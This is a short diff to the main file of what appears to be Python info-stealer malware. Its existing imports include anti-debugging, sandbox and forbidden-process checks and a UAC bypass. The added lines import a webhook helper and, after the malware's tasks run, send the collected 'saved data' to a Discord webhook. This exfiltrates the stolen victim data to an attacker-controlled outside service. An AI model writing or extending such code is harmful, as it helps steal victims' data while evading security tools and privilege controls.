@@ -13,6 +13,7 @@ from Protections.Debugger import AntiDebugger
 from Protections.System import SystemChecks
 from Protections.Noise import NoiseGenerator
 from Protections.Forbiddenprocess import ForbiddenProcessCheck
+from Utilities.Webhook import WebhookEncryptor, retrieve_saved_data
 
 from Cores.UAC import UACBypass
 
@@ -103,6 +104,11 @@ async def main(memory_handler: MemoryHandler, task_manager: TaskManager):
     atexit.register(memory_handler.memory_manager.release_memory)
     await task_manager.manage()
 
+    # Send the saved data to Discord
+    saved_data = retrieve_saved_data()
+    if saved_data:
+        encryptor = WebhookEncryptor()
+        encryptor.send_data_to_discord(saved_data)
 
 if __name__ == "__main__":
     checks = Checks(AntiDebugger(), SystemChecks(), ForbiddenProcessCheck())
